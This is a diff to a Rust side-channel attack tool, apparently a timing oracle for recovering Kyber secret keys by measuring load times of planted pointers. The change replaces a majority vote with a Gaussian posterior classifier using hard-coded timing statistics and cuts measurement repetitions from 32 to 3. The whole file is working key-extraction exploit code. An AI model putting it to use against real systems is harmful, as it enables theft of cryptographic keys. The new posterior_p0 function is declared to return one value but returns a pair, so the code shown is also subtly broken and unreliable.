@@ -14,6 +14,7 @@ use std::io::{Read, Write};
 use std::sync::mpsc::{self, TryRecvError};
 use std::thread;
 use std::time::Instant;
+use std::f64::consts::PI;
 // file lib
 use std::fs::{File, read_to_string};
 // random value lib
@@ -47,6 +48,53 @@ fn get_ptr_ct(ptr: *mut u64, target_ptr: u64, pos: usize, rand_mask: u64, rng: &
             unsafe{ *ptr.add(i) = target_ptr ^ (rng.gen::<u64>() & 0xffff00) ^ rand_mask; }
         }
     }
+}
+
+// Hard-coded values!
+const MU_0:    f64 = 677.412;
+const SIGMA_0: f64 = 287.402;
+const MU_1:    f64 = 858.235;
+const SIGMA_1: f64 = 242.153;
+
+const T_MIN: u32 = 1;
+const T_MAX: u32 = 1500;
+
+#[inline(always)]
+fn log_pdf(t: f64, mu: f64, sigma: f64) -> f64 {
+    let diff   = t - mu;
+    let s2     = sigma * sigma;
+    -0.5 * diff * diff / s2 - 0.5 * (2.0 * PI).ln() - sigma.ln()
+}
+
+/// numerically stable log-sum-exp for two values
+#[inline(always)]
+fn log_sum_exp(a: f64, b: f64) -> f64 {
+    if a > b {
+        a + (b - a).exp().ln_1p()
+    } else {
+        b + (a - b).exp().ln_1p()
+    }
+}
+
+/// posterior P(class = 0 | measurements) with uniform prior
+fn posterior_p0(times: &[u32]) -> f64 {
+    let mut log_lik_0 = 0.0;
+    let mut log_lik_1 = 0.0;
+    let mut skipped = 0usize;
+
+    for &t in times {
+        if !(T_MIN..=T_MAX).contains(&t) {
+            skipped += 1;
+            continue;
+        }
+        let t = t as f64;
+        log_lik_0 += log_pdf(t, MU_0, SIGMA_0);
+        log_lik_1 += log_pdf(t, MU_1, SIGMA_1);
+    }
+
+    // posterior with equal priors
+    let log_den   = log_sum_exp(log_lik_0, log_lik_1);
+    ((log_lik_0 - log_den).exp(), skipped)
 }
 
 fn kyber_hacker(
@@ -463,7 +511,7 @@ fn kyber_hacker(
 
     // instead of creating a ciphertext here, we rely on a smart process that will submit us
     // with them, we just need to measure the timing, i.e. we are implementing an oracle here
-    let oracle_repetitions: usize = 32;
+    let oracle_repetitions: usize = 3;
     let mut ct_idx: usize = 0;
     let mut total_calls: usize = 0;
     let mut total_skipped_calls: usize = 0;
@@ -542,27 +590,10 @@ fn kyber_hacker(
             stream.read_exact(&mut msg_data).unwrap();
         }
         total_calls += oracle_repetitions;
-        let mut good_measurements: usize = 0;
-        let mut successes: usize = 0;
-        for &test_time in &times_to_load_test_ptr_atk {
-            if test_time == 0 || test_time > 1500 {
-                continue;
-            }
 
-            write!(ct_received, "{}, ", test_time).unwrap();
-
-            good_measurements += 1;
-            // If time is high, we got target_ptr, i.e. inequality is satisfied
-            if test_time >= threshold_leak {
-                successes += 1;
-            }
-        }
-        write!(ct_received, "\n").unwrap();
-        total_skipped_calls += oracle_repetitions - good_measurements;
-        // TODO: majority is not guaranteed since we may have even number of measurements
-        let majority_vote: u8 = (successes * 2 > good_measurements) as u8;
-        msg_data[0] = majority_vote;
-        oracle_stream.write_all(&msg_data);
+        let (p0, skipped) = posterior_p0(&times_to_load_test_ptr_atk);
+        total_skipped_calls += skipped;
+        oracle_stream.write_all(&p0.to_be_bytes()).unwrap();
     }
     println!("Key recovery took {} measurements, filtered out {} of them; total used = {}", total_calls, total_skipped_calls, total_calls - total_skipped_calls);
     threshold_v.clear();
